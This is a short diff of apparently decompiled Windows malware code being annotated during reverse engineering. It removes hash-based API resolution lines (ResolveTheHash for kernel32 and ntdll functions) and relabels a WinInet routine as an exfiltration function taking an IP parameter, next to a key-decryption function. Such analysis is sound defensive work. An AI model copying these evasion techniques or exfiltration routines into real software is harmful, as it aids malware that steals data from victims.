@@ -83,7 +83,6 @@ checkFileStatus(WCHAR *TheRealOne)
     int result;
 
     resolvedPath = (const WCHAR *)calloc(260, 2);
-    GetFullPathNameW = (void (__stdcall *)(void *, const WCHAR *, int))ResolveTheHash(1932064005, (int)L"kernel32.dll");
     GetFullPathNameW(TheRealOne, resolvedPath, 260);
 
     res_OftheChecks = 0;
@@ -104,10 +103,8 @@ checkFileStatus(WCHAR *TheRealOne)
     Checkskiddi__TheRealOne__file[1] = __TheRealOne__;
     Checkskiddi__TheRealOne__file[2] = 2 * pathLength + 2;
 
-    NtQueryFileAttributes = (int (__stdcall *)(int *, int, _DWORD *, void *, _DWORD, int, int, int, int, _DWORD, _DWORD))ResolveTheHash(-1245012160, (int)L"ntdll.dll");
     res_OftheChecks = NtQueryFileAttributes(&__res_OftheChecks__, 1179785, fileCheckStruct, Checkskiddi__TheRealOne__file, 0, 128, 3, 1, 32, 0, 0);
 
-    NtCleanup = (void (__stdcall *)(int))ResolveTheHash(2009039007, (int)L"ntdll.dll");
     NtCleanup(res_OftheChecks);
 
     result = __res_OftheChecks__;
@@ -129,17 +126,16 @@ verifyFileStatus(WCHAR *TheRealOne)
         return result;
 
     result__ = result;
-
-    NtQueryAttributesFile = (void (__stdcall *)(int))ResolveTheHash(-293473983, (int)L"ntdll.dll");
     NtQueryAttributesFile(result__);
 
     return 1;
 }
 
 int __cdecl 
-WinnetDllFuncRelated(const char *postData, 
-                     int dataSize, 
-                     int extraParam);
+WinnetDllFuncRelatedExfiltrationRoutineetc(const char *postData, 
+                                           int dataSize, 
+                                           int extraParam,
+                                           PSTR ip195);
 
 void 
 DecryptKeyData(const WCHAR *TheRealOne_, 
